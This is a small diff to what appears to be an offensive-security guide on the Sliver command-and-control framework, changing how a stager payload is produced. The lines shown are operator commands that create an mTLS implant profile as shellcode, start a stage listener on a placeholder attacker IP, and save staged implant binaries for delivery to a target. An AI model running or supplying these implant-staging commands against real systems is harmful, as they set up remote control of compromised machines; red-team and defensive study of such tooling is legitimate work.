@@ -97,7 +97,7 @@ Use a **stager** (few hundred bytes) instead of the full implant (MBs):
 ```bash
 sliver > profiles new --mtls <IP>:8888 --format shellcode my-profile
 sliver > stage-listener --url http://<IP>:8080 --profile my-profile
-sliver > generate --format shellcode --stage-listener http://<IP>:8080 --save /tmp/stager.bin
+sliver > profiles stage --save /tmp/stage2.bin my-profile
 ```
 
 Convert raw → array when needed:
